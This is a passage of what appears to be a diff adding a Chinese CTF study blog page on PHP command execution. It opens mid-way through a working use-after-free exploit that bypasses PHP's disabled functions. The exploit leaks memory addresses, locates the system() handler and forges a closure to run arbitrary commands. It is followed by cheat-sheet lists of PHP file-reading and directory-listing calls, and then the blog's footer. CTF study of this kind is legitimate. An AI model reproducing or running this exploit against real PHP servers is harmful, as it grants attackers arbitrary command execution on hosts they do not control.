+    $n_alloc = 10; 
+    $contiguous = [];
+    for($i = 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+    trigger_uaf(&#39;x&#39;);
+    $abc = $backtrace[1][&#39;args&#39;][0];
+    $helper = new Helper;
+    $helper-&gt;b = function ($x) &#123; &#125;;
+    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+    $closure_obj = str2ptr($abc, 0x20);
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+    if(!($elf = parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+    if(!($zif_system = get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i &lt; 0x110; $i += 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); 
+    write($abc, 0xd0 + 0x68, $zif_system); 
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+
+ctfshow(&quot;指令填写在这里！！！&quot;);ob_end_flush();
+?&gt;
+</code></pre>
+<p>读取文件函数一览表</p>
+<pre><code>highlight_file($filename);
+show_source($filename);
+print_r(php_strip_whitespace($filename));
+print_r(file_get_contents($filename));
+readfile($filename);
+print_r(file($filename)); // var_dump
+fread(fopen($filename,&quot;r&quot;), $size);
+include($filename); // 非php代码
+include_once($filename); // 非php代码
+require($filename); // 非php代码
+require_once($filename); // 非php代码
+print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
+print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行
+fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF
+print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));
+print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记
+print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));
+print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
+</code></pre>
+<p>读取目录一览表</p>
+<pre><code>print_r(glob(&quot;*&quot;)); // 列当前目录
+print_r(glob(&quot;/*&quot;)); // 列根目录
+print_r(scandir(&quot;.&quot;));
+print_r(scandir(&quot;/&quot;));
+$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;
+$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;
+$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;
+$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;
+</code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="Shunyu 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="Shunyu 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%97%A5%E6%8A%A5/" rel="tag"><i class="fa fa-tag"></i> 日报</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="CTFshow刷题记录">
+                  <i class="fa fa-angle-left"></i> CTFshow刷题记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含">
+                  文件包含 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="valine-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Shunyu</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">157k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/liu1272" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/comments.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/motion.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/sidebar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/next-boot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/bookmark.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/search/local-search.min.js"></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/tags/pdf.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/fancybox.min.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+<script class="next-config" data-name="valine" type="application/json">{"enable":true,"appId":"Saj0Y9foXlqnIK4Ing0paYci-MdYXbMMI","appKey":"eSefitZxNdI9H6p6lkyRYI5g","serverURLs":"https://saj0y9fo.api.lncldglobal.com","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":true,"enableQQ":true,"requiredFields":[],"el":"#valine-comments","path":"/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.valine.el)
+    .then(() => NexT.utils.getScript(
+      'https://fastly.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+      { condition: window.Valine }
+    ))
+    .then(() => {
+      new Valine(CONFIG.valine);
+    });
+});
+</script>
+
+
+</body>
+</html>
